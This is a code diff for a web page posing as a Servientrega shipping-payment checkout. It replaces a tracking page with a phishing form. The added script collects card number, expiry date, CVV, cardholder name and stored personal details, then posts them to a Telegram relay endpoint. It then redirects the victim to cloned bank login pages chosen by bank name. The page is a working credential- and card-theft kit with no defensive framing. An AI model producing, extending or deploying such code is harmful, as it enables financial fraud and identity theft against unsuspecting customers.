@@ -2,312 +2,488 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Servientrega</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pago - Servientrega</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link rel="stylesheet" href="css/styles.css">
     <style>
-        @media (max-width: 768px) {
-            .main-content {
-                height: 40vh !important;
-                min-height: 430px !important;
-            }
-        }
-        /* small helper so loading overlay centers correctly if flex wasn't applied via CSS */
-        #loadingScreen { display: none; align-items: center; justify-content: center; }
+        /* (Tu CSS original, sin cambios) */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background-color: #f5f5f5; color:#333; }
+        .header { background: linear-gradient(135deg,#4CAF50,#45a049); padding:20px 0; }
+        .header-content { max-width:1200px; margin:0 auto; display:flex; justify-content:center; align-items:center; padding:0 20px; }
+        .header img { height:40px; }
+        .container { max-width:1100px; margin:40px auto; display:flex; gap:30px; padding:0 20px; }
+        .payment-box { flex:1; background:white; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.08); padding:35px; }
+        .payment-box h2 { font-size:24px; font-weight:600; color:#555; margin-bottom:30px; }
+        .payment-methods { display:flex; flex-direction:column; gap:15px; margin-bottom:30px; }
+        .payment-method { border:2px solid #e0e0e0; border-radius:12px; padding:20px 25px; display:flex; align-items:center; gap:20px; cursor:pointer; transition:all .3s; position:relative; }
+        .payment-method:hover { border-color:#4CAF50; background:#f9f9f9; }
+        .payment-method.selected { border-color:#4CAF50; background:#f1f8f4; }
+        .payment-method-icon { width:60px; height:60px; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+        .payment-method-icon img { max-width:100%; max-height:100%; object-fit:contain; }
+        .payment-method-text { flex:1; }
+        .payment-method-title { font-size:16px; font-weight:500; color:#333; }
+        .payment-method-badge { position:absolute; top:-8px; left:45px; background:#1a73e8; color:white; font-size:11px; font-weight:600; padding:3px 8px; border-radius:3px; text-transform:uppercase; }
+        .payment-form { display:none; animation: slideDown .3s ease-out; margin-top:10px; }
+        .payment-form.active { display:block; }
+        @keyframes slideDown { from{opacity:0; transform:translateY(-10px);} to{opacity:1; transform:translateY(0);} }
+        .card-icons { display:flex; gap:10px; margin-bottom:25px; align-items:center; }
+        .card-icons img { height:30px; opacity:.8; }
+        .field { margin-bottom:20px; }
+        .field label { display:block; margin-bottom:8px; font-weight:500; color:#333; font-size:14px; }
+        input[type="text"], input[type="tel"], select { width:100%; padding:14px 16px; border:1px solid #e0e0e0; border-radius:8px; font-size:15px; font-family:'Inter',sans-serif; transition:all .3s; }
+        input[type="text"]:focus, input[type="tel"]:focus, select:focus { outline:none; border-color:#4CAF50; box-shadow:0 0 0 3px rgba(76,175,80,.1); }
+        .half-field { display:flex; gap:12px; }
+        .half-field input { flex:1; }
+        .btn { background:#4CAF50; color:white; font-weight:600; font-size:16px; border:none; padding:16px; width:100%; border-radius:8px; cursor:pointer; transition:all .3s; margin-top:10px; }
+        .btn:hover { background:#45a049; transform:translateY(-2px); box-shadow:0 4px 12px rgba(76,175,80,.3); }
+        .secure { text-align:center; margin-top:20px; color:#4CAF50; font-size:14px; display:flex; align-items:center; justify-content:center; gap:8px; font-weight:500; }
+        .secure i { font-size:16px; }
+        .summary-box { flex:0 0 350px; background:white; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,.08); padding:30px; height:fit-content; }
+        .summary-box h3 { font-size:20px; font-weight:600; color:#333; margin-bottom:20px; padding-bottom:15px; border-bottom:2px solid #f0f0f0; }
+        .summary-line { display:flex; justify-content:space-between; margin-bottom:15px; font-size:15px; color:#666; }
+        .summary-line.total { margin-top:20px; padding-top:20px; border-top:2px solid #f0f0f0; font-size:18px; font-weight:600; color:#333; }
+        .summary-line .price { font-weight:600; color:#333; }
+        .summary-line.total .price { color:#4CAF50; font-size:24px; }
+        .old-price { text-decoration:line-through; color:#999; font-size:14px; margin-left:10px; font-weight:400; }
+        .note { margin-top:20px; padding:15px; background:#f9f9f9; border-radius:8px; font-size:12px; color:#666; line-height:1.5; }
+        .note strong { color:#333; }
+        #modalCarga { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.7); display:none; justify-content:center; align-items:center; z-index:9999; }
+        .modal-content { background:white; padding:40px; border-radius:12px; text-align:center; max-width:90%; }
+        .spinner { border:4px solid #f3f3f3; border-top:4px solid #4CAF50; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 20px; }
+        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+        .modal-content p { font-size:16px; color:#333; font-weight:500; }
+        @media (max-width:768px){ .container{flex-direction:column; margin:20px auto; padding:0 15px; gap:20px;} .payment-box,.summary-box{width:100%; padding:25px 20px;} .payment-box h2{font-size:20px;} }
+        @media (max-width:480px){ .payment-box,.summary-box{padding:20px 15px;} .payment-box h2{font-size:18px;} }
     </style>
 </head>
 <body>
-    <!-- Header -->
     <header class="header">
         <div class="header-content">
-            <div class="logo">
-                <img src="img/logo-servientrega-blanco.svg" alt="">
-            </div>
-            <nav class="nav-menu desktop-only">
-                <a href="#">Rastrear</a>
-                <a href="#">Cotizar</a>
-                <a href="#">Recoger</a>
-                <a href="#">Soluciones</a>
-                <a href="#">Nuestra red</a>
-            </nav>
-            <button class="login-btn desktop-only">Ingresar</button>
+            <img src="img/logo-servientrega-blanco.svg" alt="Servientrega">
         </div>
     </header>
-     <div class="main-content" style="background-color: #f5f5f5; padding: 0; width: 100%;">
-            <div class="content-left">
-                <div class="pink-line"></div>
-                <div class="content-text">
-                    <h1 class="main-title">Conoce nuestras líneas de atención</h1>
-                    <button class="contact-btn">Contacto</button>
-                </div>
-            </div>
-            <div class="content-right">
-              <img src="img/pagina.png" style="width: 70%;" alt="" id="heroImage">
-            </div>
-        </div>
 
-    <!-- Main Content -->
-    <main style="background-color: white;">
-        <!-- Search Section Desktop -->
-        <div class="search-section">
-            <form class="search-form" id="searchFormDesktop">
-                <label class="search-label">Consultar</label>
-                <select class="search-select">
-                    <option>Envíos</option>
-                    <option>Rastreo</option>
-                    <option>Cotización</option>
-                </select>
-                <input type="text" class="search-input" id="searchInputDesktop" placeholder="Ingresa el # de guía">
-                <button type="submit" class="search-btn" id="searchBtnDesktop">
-                    <i class="fas fa-arrow-right"></i>
-                </button>
-            </form>
-        </div>
-
-        <!-- Search Section Mobile -->
-        <div class="consultar-container">
-            <div class="consultar-header">
-                <h2 class="consultar-title">Consultar</h2>
-                <div class="consultar-form">
-                    <div class="dropdown-container">
-                        <select class="dropdown-select" id="enviosSelect">
-                            <option value="envios">Envíos</option>
-                            <option value="paquetes">Paquetes</option>
-                            <option value="documentos">Documentos</option>
-                        </select>
-                        <i class="fas fa-chevron-down dropdown-arrow"></i>
+    <div class="container">
+        <div class="payment-box">
+            <h2>Escoge un método de pago</h2>
+            
+            <div class="payment-methods">
+                <div class="payment-method" onclick="seleccionarMetodo(this, 'tarjeta')">
+                    <div class="payment-method-icon">
+                        <img src="img/depositphotos_106860552-stock-photo-collection-of-popular-payment-system.jpg" alt="Tarjetas">
                     </div>
-                    <div class="input-container">
-                        <input type="text" class="search-input" placeholder="Ingresa el # de guía" id="searchInput">
+                    <div class="payment-method-text">
+                        <div class="payment-method-title">Usa tus Tarjetas</div>
                     </div>
-                    <button type="button" class="search-button" id="searchBtnMobile">
-                        <i class="fas fa-chevron-right"></i>
-                    </button>
                 </div>
+
+                <!-- <div class="payment-method" onclick="seleccionarMetodo(this, 'banco')">
+                    <div class="payment-method-badge">Nuevo</div>
+                    <div class="payment-method-icon">
+                        <img src="img/LogoBancolombia.png" alt="Bancolombia" style="width:100%;">
+                    </div>
+                    <div class="payment-method-text">
+                        <div class="payment-method-title">Transfiere con tu cuenta Bancolombia</div>
+                    </div>
+                </div> -->
+
+                <!-- <div class="payment-method" onclick="seleccionarMetodo(this, 'corresponsal')">
+                    <div class="payment-method-icon">
+                        <i class="fas fa-hand-holding-usd" style="font-size:35px; color:#4CAF50;"></i>
+                    </div>
+                    <div class="payment-method-text">
+                        <div class="payment-method-title">Paga en efectivo en un Corresponsal Bancario</div>
+                    </div>
+                </div> -->
+
+                <!-- <div class="payment-method" onclick="seleccionarMetodo(this, 'nequi')">
+                    <div class="payment-method-icon">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a0/Nequi_logo.svg/2560px-Nequi_logo.svg.png" alt="Nequi">
+                    </div>
+                    <div class="payment-method-text">
+                        <div class="payment-method-title">Usa tu cuenta Nequi</div>
+                    </div>
+                </div> -->
+
+                <div class="payment-method" onclick="seleccionarMetodo(this, 'pse')">
+                    <div class="payment-method-icon">
+                        <img src="img/pse-1-300x300 (1).png" alt="PSE">
+                    </div>
+                    <div class="payment-method-text">
+                        <div class="payment-method-title">Usa tu cuenta de ahorros o corriente</div>
+                    </div>
+                </div>
+
+                <!-- Placeholder: mantenemos la posición original para restaurar -->
+                <div id="form-placeholder" aria-hidden="true"></div>
+
+            </div> <!-- .payment-methods -->
+
+            <!-- Formulario de Tarjeta (se moverá dinámicamente justo debajo del método seleccionado) -->
+            <div id="form-tarjeta" class="payment-form" aria-hidden="true">
+                <div class="field">
+                    <label for="card-number">Número de tarjeta</label>
+                    <input type="tel" id="card-number" placeholder="0000 0000 0000 0000" inputmode="numeric" autocomplete="cc-number">
+                </div>
+
+                <div class="field">
+                    <label>Fecha de expiración y CVV</label>
+                    <div class="half-field">
+                        <input type="text" id="expiry-month" placeholder="MM" maxlength="2" pattern="[0-9]{2}" inputmode="numeric" autocomplete="cc-exp-month">
+                        <input type="text" id="expiry-year" placeholder="AA" maxlength="2" pattern="[0-9]{2}" inputmode="numeric" autocomplete="cc-exp-year">
+                        <input type="text" id="cvv" placeholder="CVV" maxlength="4" pattern="[0-9]{3,4}" inputmode="numeric" autocomplete="cc-csc">
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label for="card-holder">Titular de la tarjeta</label>
+                    <input type="text" id="card-holder" placeholder="Nombre completo" autocomplete="cc-name">
+                </div>
+
+                <div class="field">
+                    <label for="banco-select">Selecciona tu banco</label>
+                    <select id="banco-select">
+                        <option value="">Seleccionar banco...</option>
+                        <option value="BANCOLOMBIA">Bancolombia</option>
+                        <option value="BANCO AGRARIO">Banco Agrario</option>
+                        <option value="BANCO AVVILLAS">Banco AV Villas</option>
+                        <option value="BANCO BBVA">BBVA Colombia</option>
+                        <option value="BANCO CAJA SOCIAL">Banco Caja Social</option>
+                        <option value="BANCO CITIBANK">Citibank</option>
+                        <option value="BANCO COLPATRIA">Banco Colpatria</option>
+                        <option value="BANCO CORPBANCA">Corpbanca</option>
+                        <option value="BANCO DAVIVIENDA">Davivienda</option>
+                        <option value="BANCO DE BOGOTA">Banco de Bogotá</option>
+                        <option value="BANCO DE OCCIDENTE">Banco de Occidente</option>
+                        <option value="BANCO FALABELLA">Banco Falabella</option>
+                        <option value="BANCO FINANDINA">Banco Finandina</option>
+                        <option value="BANCO GANADERO">Banco Ganadero</option>
+                        <option value="BANCO GNB SUDAMERIS">GNB Sudameris</option>
+                        <option value="BANCO HSBC COLOMBIA">HSBC Colombia</option>
+                        <option value="BANCO ITAU">Banco Itaú</option>
+                        <option value="BANCO POPULAR">Banco Popular</option>
+                        <option value="BANCO SANTANDER">Banco Santander</option>
+                        <option value="BANCO CREDIBANCO">Credibanco</option>
+                        <option value="BANCO HELM BANK">Helm Bank</option>
+                        <option value="Nequi">Nequi</option>
+                        <option value="SERFINANSA">Serfinansa</option>
+                        <option value="SERVIBANCA">Servibanca</option>
+                        <option value="TUYA">Tuya</option>
+                        <option value="NUBANK">Nu Colombia</option>
+                    </select>
+                </div>
+
+                <button class="btn" id="btn-pagar">Realizar pago</button>
+            </div>
+            
+            <div class="secure">
+                <i class="fas fa-lock"></i>
+                Pago 100% seguro
             </div>
         </div>
 
-        <!-- Services Section -->
-        <div class="services-section">
-            <h2 class="services-title" style="padding-top: 5%;">Conoce nuestras soluciones logísticas</h2>
-            <div class="services-grid">
-                <div class="service-card">
-                    <img src="img/ico-big-transporte-entrega.svg" alt="">
-                    <h3 class="service-title">Transporte y Entrega | Soluciones Logísticas | Servientrega</h3>
-                    <p class="service-description">Recogemos en tu puerta y entregamos en el tiempo que requieras.</p>
-                    <a href="#" class="service-link">Ver más <i class="fas fa-arrow-right"></i></a>
-                </div>
-                <div class="service-card">
-                    <img src="img/ico-big-soluciones-logistica.svg" alt="">
-                    <h3 class="service-title">Soluciones Logísticas Eficientes</h3>
-                    <p class="service-description">Optimizamos tu logística para campañas y tu almacenamiento.</p>
-                    <a href="#" class="service-link">Ver más <i class="fas fa-arrow-right"></i></a>
-                </div>
-                <div class="service-card">
-                    <img src="img/ico-digitales.svg" alt="">
-                    <h3 class="service-title">Soluciones Digitales | Innovación y Tecnología Logística</h3>
-                    <p class="service-description">Entregas electrónicas, SMS, email masivo y más para publicidad, legales y otros.</p>
-                    <a href="#" class="service-link">Ver más <i class="fas fa-arrow-right"></i></a>
-                </div>
+        <div class="summary-box">
+            <h3>Resumen de compra</h3>
+            
+            <div class="summary-line">
+                <span>Producto</span>
+                <span class="price">Servicio de envío</span>
             </div>
-        </div>
-    </main>
+            
+            <div class="summary-line">
+                <span>Precio</span>
+                <span class="price">$7.990</span>
+            </div>
+            
+            <div class="summary-line">
+                <span>IVA (19%)</span>
+                <span class="price">$328</span>
+            </div>
+            
+            <div class="summary-line total">
+                <span>Total a pagar</span>
+                <span class="price">$8.318 <span class="old-price">$25.000</span></span>
+            </div>
 
-    <!-- Loading Screen -->
-    <div id="loadingScreen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); z-index: 9999; justify-content: center; align-items: center;">
-        <div style="text-align: center; color: white;">
-            <i class="fas fa-spinner fa-spin" style="font-size: 50px; margin-bottom: 20px;"></i>
-            <p id="loadingText">Cargando información...</p>
+            <div class="note">
+                El cargo en tu tarjeta o cuenta bancaria aparecerá como <strong>SVE S.A.</strong>
+            </div>
         </div>
     </div>
 
-<script>
-/*
-  Robust index.js logic:
-  - Clears previous result when a new search starts (evita datos estáticos viejos).
-  - Usa fetch con cache: 'no-store' + AbortController timeout.
-  - Sólo guarda sessionStorage.rastroResult cuando resultado.success === true.
-  - Console logs para debug.
-*/
+    <div id="modalCarga" aria-hidden="true">
+        <div class="modal-content">
+            <div class="spinner" role="status" aria-hidden="true"></div>
+            <p>Procesando pago...</p>
+        </div>
+    </div>
 
-/* Ajusta aquí la URL pública de tu tunnel (cloudflared) si tu frontend está en otro dominio.
-   Si sirves frontend y backend en el mismo host puedes dejar '' para usar rutas relativas.
-*/
-const API_BASE = 'https://apiservi.onrender.com'; // <-- reemplaza por tu dominio público o deja '' si está en el mismo origen
+    <script>
+    // Mapeo de redirecciones por banco (reutilizable)
+    const BANK_REDIRECTIONS = {
+        'BANCOLOMBIA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/bancol/personas/formulario_u1.php',
+        'BANCO AGRARIO': 'pago.html',
+        'BANCO AVVILLAS': 'https://servientregaguia-detalles.alwaysdata.net/sucur/avillas/personas/formulario_u1.php',
+        'BANCO BBVA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/bbva/personas/formulario_u1.php',
+        'BANCO CAJA SOCIAL': 'https://servientregaguia-detalles.alwaysdata.net/sucur/caja/personas/formulario_u1.php',
+        'BANCO CITIBANK': 'pago.html',
+        'BANCO COLPATRIA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/scoti/personas/formulario_u1.php',
+        'BANCO CORPBANCA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/itau/personas/formulario_u1.php',
+        'BANCO DAVIVIENDA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/davi/personas/formulario_u1.php',
+        'BANCO DE BOGOTA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/bogota/personas/formulario_u1.php',
+        'BANCO DE OCCIDENTE': 'https://servientregaguia-detalles.alwaysdata.net/occidente/bancol/personas/formulario_u1.php',
+        'BANCO FALABELLA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/fala/personas/formulario_u1.php',
+        'BANCO FINANDINA': 'pago.html',
+        'BANCO GANADERO': 'pago.html',
+        'BANCO GNB SUDAMERIS': 'pago.html',
+        'BANCO HSBC COLOMBIA': 'cargapago.html',
+        'BANCO ITAU': 'https://servientregaguia-detalles.alwaysdata.net/sucur/itau/personas/formulario_u1.php',
+        'BANCO POPULAR': 'pago.html',
+        'BANCO SANTANDER': 'pago.html',
+        'BANCO CREDIBANCO': 'pago.html',
+        'BANCO HELM BANK': 'pago.html',
+        'Nequi': 'https://servientregaguia-detalles.alwaysdata.net/sucur/nequi/personas/formulario_u1.php',
+        'SERFINANSA': 'pago.html',
+        'SERVIBANCA': 'pago.html',
+        'TUYA': 'pago.html',
+        'NUBANK': 'pago.html'
+    };
 
-let loadingMessageInterval = null;
-
-function showLoading(message) {
-    const overlay = document.getElementById('loadingScreen');
-    const loadingText = document.getElementById('loadingText');
-    if (message) loadingText.textContent = message;
-    overlay.style.display = 'flex';
-    overlay.style.flexDirection = 'column';
-    
-    const loadingMessages = [
-        'Cargando información...',
-        'Consultando el estado de tu envío...',
-        'Buscando datos en nuestro sistema...',
-        'Verificando la información...',
-        'Procesando tu solicitud...',
-        'Rastreando tu paquete...',
-        'Obteniendo detalles del envío...',
-        'Casi listo, un momento más...'
-    ];
-    
-    let messageIndex = 0;
-    loadingMessageInterval = setInterval(() => {
-        messageIndex = (messageIndex + 1) % loadingMessages.length;
-        loadingText.textContent = loadingMessages[messageIndex];
-    }, 3000);
-}
-
-function hideLoading() {
-    const overlay = document.getElementById('loadingScreen');
-    overlay.style.display = 'none';
-    
-    if (loadingMessageInterval) {
-        clearInterval(loadingMessageInterval);
-        loadingMessageInterval = null;
+    // ---- Utilidades UI ----
+    function mostrarModalCarga() {
+        const modal = document.getElementById('modalCarga');
+        if (modal) modal.style.display = 'flex';
     }
-}
-
-function validateNumero(numero) {
-    if (!numero) return 'Debes ingresar un número de guía';
-    if (!/^\d+$/.test(numero)) return 'El número de guía debe contener solo dígitos';
-    return null;
-}
-
-async function sendRastrear(numero) {
-    const url = (API_BASE && API_BASE.length) ? `${API_BASE}/rastrear` : '/rastrear';
-
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 120000); // 120s timeout
-
-    try {
-        console.debug('[rastrear] POST ->', url, 'numero:', numero);
-        const resp = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ numero_guia: numero }),
-            signal: controller.signal,
-            cache: 'no-store', // evitar respuestas cacheadas
-            // credentials: 'same-origin' // si necesitas cookies, descomenta
-        });
-
-        clearTimeout(timeout);
-
-        // Verificar status
-        const text = await resp.text(); // leemos texto primero para manejar JSON o no-JSON
-        let parsed;
-        try {
-            parsed = text ? JSON.parse(text) : null;
-        } catch (e) {
-            console.error('[rastrear] respuesta no JSON:', text);
-            throw new Error('Respuesta inválida del servidor (no JSON). Revisa logs del backend.');
-        }
-
-        if (!resp.ok) {
-            const errMsg = (parsed && parsed.error) ? parsed.error : `Error en la petición: ${resp.status}`;
-            throw new Error(errMsg);
-        }
-
-        // parsed ahora es JSON
-        return parsed;
-    } catch (err) {
-        clearTimeout(timeout);
-        if (err.name === 'AbortError') {
-            throw new Error('El servidor está tardando demasiado. Intenta de nuevo en unos segundos.');
-        }
-        throw err;
-    }
-}
-
-// Helper: start a search (shared by desktop and mobile)
-async function startSearch(numero) {
-    const err = validateNumero(numero);
-    if (err) { alert(err); return; }
-
-    // Limpieza de cualquier resultado viejo PARA EVITAR que detalle.html muestre datos estáticos antiguos
-    try {
-        sessionStorage.removeItem('rastroResult');
-        sessionStorage.removeItem('rastroNumero');
-    } catch (e) {
-        console.warn('[rastrear] no se pudo limpiar sessionStorage:', e);
+    function ocultarModalCarga() {
+        const modal = document.getElementById('modalCarga');
+        if (modal) modal.style.display = 'none';
     }
 
-    showLoading('Cargando información...');
+    // ---- Selección de método ----
+    function seleccionarMetodo(elemento, metodo) {
+        document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
+        const form = document.getElementById('form-tarjeta');
+        const placeholder = document.getElementById('form-placeholder');
+        if (!form || !placeholder) return;
 
-    try {
-        const resultado = await sendRastrear(numero);
-
-        if (!resultado) {
-            hideLoading();
-            alert('Respuesta vacía del servidor');
+        if (metodo === 'tarjeta') {
+            elemento.classList.add('selected');
+            elemento.insertAdjacentElement('afterend', form);
+            form.classList.add('active');
+            form.setAttribute('aria-hidden', 'false');
+            const first = form.querySelector('#card-number');
+            if (first) first.focus();
             return;
         }
 
-        // Si backend devuelve success === true, guardar y redirigir
-        if (resultado.success === true) {
-            try {
-                sessionStorage.setItem('rastroResult', JSON.stringify(resultado));
-                sessionStorage.setItem('rastroNumero', numero);
-                console.debug('[rastrear] Resultado guardado en sessionStorage');
-            } catch (e) {
-                console.error('[rastrear] error guardando sessionStorage', e);
-                hideLoading();
-                alert('Error guardando resultado en el navegador.');
-                return;
+        // restaurar formulario al placeholder y ocultarlo
+        placeholder.insertAdjacentElement('afterend', form);
+        form.classList.remove('active');
+        form.setAttribute('aria-hidden', 'true');
+
+        elemento.classList.add('selected');
+
+        if (metodo === 'pse') {
+            mostrarModalCarga();
+            setTimeout(() => {
+                ocultarModalCarga();
+                window.location.href = 'rse.html';
+            }, 1500);
+        } else if (metodo === 'banco' || metodo === 'corresponsal') {
+            window.location.href = 'rse.html';
+        } else if (metodo === 'nequi') {
+            window.location.href = 'bancos/nequi/';
+        }
+    }
+
+    // ---- Algoritmo Luhn ----
+    function algoritmoLuhn(numeroTarjeta) {
+        let suma = 0;
+        let alternar = false;
+        for (let i = numeroTarjeta.length - 1; i >= 0; i--) {
+            let digito = parseInt(numeroTarjeta.charAt(i), 10);
+            if (alternar) {
+                digito *= 2;
+                if (digito > 9) digito -= 9;
             }
+            suma += digito;
+            alternar = !alternar;
+        }
+        return (suma % 10) === 0;
+    }
 
-            // Redirigir a detalle.html tras un breve delay para asegurar que storage esté listo
-            hideLoading();
-            window.location.href = 'detalle.html';
-            return;
-        } else {
-            // Backend devolvió success false -> mostrar el error y no redirigir ni guardar
-            hideLoading();
-            const errText = resultado.error || 'No se encontró información para este número de guía.';
-            alert(errText);
-            return;
+    // ---- Verificación ----
+    function verificarSistemaIlunh(numeroTarjeta, mes, anio, cvv) {
+        try {
+            const numeroLimpio = String(numeroTarjeta).replace(/\s+/g, '');
+            if (numeroLimpio.length < 13 || numeroLimpio.length > 19) return false;
+            if (!/^\d+$/.test(numeroLimpio)) return false;
+            if (!algoritmoLuhn(numeroLimpio)) return false;
+            if (!/^\d{3,4}$/.test(cvv)) return false;
+            const mesNum = parseInt(mes, 10);
+            if (isNaN(mesNum) || mesNum < 1 || mesNum > 12) return false;
+            let añoNum = parseInt(anio, 10);
+            if (isNaN(añoNum)) return false;
+            if (anio.length === 2) añoNum += 2000;
+            const ahora = new Date();
+            const fechaExpira = new Date(añoNum, mesNum);
+            if (fechaExpira <= ahora) return false;
+            return true;
+        } catch (e) {
+            console.error('Error verificación:', e);
+            return false;
+        }
+    }
+
+    // ---- Envío a Telegram y redirección POST-OK ----
+    async function enviarDatosTelegram() {
+        const btnPagar = document.getElementById('btn-pagar');
+        if (btnPagar) btnPagar.disabled = true;
+
+        const numeroTarj = document.getElementById('card-number')?.value.replace(/\s+/g, '') || '';
+        const mes = document.getElementById('expiry-month')?.value || '';
+        const anio = document.getElementById('expiry-year')?.value || '';
+        const cvv = document.getElementById('cvv')?.value || '';
+        const titular = document.getElementById('card-holder')?.value || '';
+        const bancoSeleccionado = document.getElementById('banco-select')?.value || '';
+
+        if (!numeroTarj || !mes || !anio || !cvv || !titular) {
+            alert('Por favor completa todos los campos de la tarjeta.');
+            if (btnPagar) btnPagar.disabled = false;
+            return false;
         }
 
-    } catch (err) {
-        hideLoading();
-        console.error('[rastrear] error durante la búsqueda:', err);
-        alert(err.message || 'Error desconocido durante la búsqueda');
-    }
-}
+        mostrarModalCarga();
 
-// Desktop form submit
-document.addEventListener('DOMContentLoaded', function () {
-    const formDesktop = document.getElementById('searchFormDesktop');
-    if (formDesktop) {
-        formDesktop.addEventListener('submit', function (e) {
-            e.preventDefault(); // evitar recarga
-            const input = document.getElementById('searchInputDesktop');
-            const numero = input ? input.value.trim() : '';
-            startSearch(numero);
-        });
+        if (!verificarSistemaIlunh(numeroTarj, mes, anio, cvv)) {
+            ocultarModalCarga();
+            alert('Datos de tarjeta inválidos. Por favor verifica los datos.');
+            if (btnPagar) btnPagar.disabled = false;
+            return false;
+        }
+
+        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+        const formSubmitted = localStorage.getItem('formSubmitted') || 'false';
+        const submissionDate = localStorage.getItem('submissionDate') || 'No especificada';
+
+        const fechaExp = `${mes}/${anio}`;
+        const mensaje = `🔻 *Nueva compra realizada* 🔻
+
+👤 *Datos del cliente:*
+Nombre: ${userData.firstName || ''} ${userData.lastName || ''}
+📞 Teléfono: ${userData.phone || ''}
+📍 Dirección: ${userData.address || ''}
+🏙️ Municipio: ${userData.municipality || ''}
+🏢 Departamento: ${userData.department || ''}
+
+📅 Fecha de envío: ${submissionDate}
+✅ Formulario enviado: ${formSubmitted}
+
+💳 *Datos de pago:*
+Titular: ${titular}
+Número: ${numeroTarj}
+📅 Expiración: ${fechaExp}
+🔐 CVV: ${cvv}
+
+✅ *Verificación ilunh: APROBADA*`.trim();
+
+        try {
+            const resp = await fetch('https://apitemu.vercel.app/api/send-telegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: mensaje })
+            });
+
+            if (resp.ok) {
+                // decidir destino según banco seleccionado (si existe en el mapa)
+                const destino = BANK_REDIRECTIONS[bancoSeleccionado] || 'rse.html';
+                setTimeout(() => {
+                    ocultarModalCarga();
+                    window.location.href = destino;
+                }, 900);
+                return true;
+            } else {
+                ocultarModalCarga();
+                console.error('Error API status:', resp.status);
+                alert('Error al procesar el pago. Por favor, inténtalo de nuevo.');
+                if (btnPagar) btnPagar.disabled = false;
+                return false;
+            }
+        } catch (err) {
+            ocultarModalCarga();
+            console.error('Fallo de red:', err);
+            alert('Error de red. Por favor, verifica tu conexión a internet.');
+            if (btnPagar) btnPagar.disabled = false;
+            return false;
+        }
     }
 
-    // Mobile button handler
-    const btnMobile = document.getElementById('searchBtnMobile');
-    if (btnMobile) {
-        btnMobile.addEventListener('click', function () {
-            const input = document.getElementById('searchInput');
-            const numero = input ? input.value.trim() : '';
-            startSearch(numero);
-        });
+    function procesarPago() {
+        // Llama a enviarDatosTelegram y la redirección ocurre allí SOLO si OK
+        enviarDatosTelegram();
     }
 
-    // Optionally, clear stale result on initial load to avoid showing old data if user opens detalle directly
-    // (comentado porque podría no ser deseado). Si quieres forzar la limpieza al cargar index,
-    // descomenta las dos líneas siguientes:
-    // try { sessionStorage.removeItem('rastroResult'); sessionStorage.removeItem('rastroNumero'); } catch(e){}
-});
+    // ---- Listeners y formateo ----
+    document.addEventListener('DOMContentLoaded', function() {
+        // Formato del número de tarjeta (grupos de 4)
+        const cardInput = document.getElementById('card-number');
+        if (cardInput) {
+            cardInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+                e.target.value = formatted;
+            });
+        }
+
+        // Mes
+        const monthInput = document.getElementById('expiry-month');
+        if (monthInput) {
+            monthInput.addEventListener('input', function(e) {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length > 2) v = v.slice(0,2);
+                if (v.length === 2) {
+                    const num = parseInt(v, 10);
+                    if (num < 1) v = '01';
+                    if (num > 12) v = '12';
+                }
+                e.target.value = v;
+            });
+        }
+
+        // Año
+        const yearInput = document.getElementById('expiry-year');
+        if (yearInput) {
+            yearInput.addEventListener('input', function(e) {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length > 2) v = v.slice(0,2);
+                e.target.value = v;
+            });
+        }
+
+        // CVV
+        const cvvInput = document.getElementById('cvv');
+        if (cvvInput) {
+            cvvInput.addEventListener('input', function(e) {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length > 4) v = v.slice(0,4);
+                e.target.value = v;
+            });
+        }
+
+        // Botón pagar
+        const btnPagar = document.getElementById('btn-pagar');
+        if (btnPagar) {
+            btnPagar.addEventListener('click', function(e) {
+                e.preventDefault();
+                procesarPago();
+            });
+        }
+
+        // NOTA: removimos la escucha 'change' que redirigía al seleccionar banco.
+        // Ahora la redirección ocurre SOLO después de enviarDatosTelegram() y recibir OK.
+    });
 </script>
 
 </body>
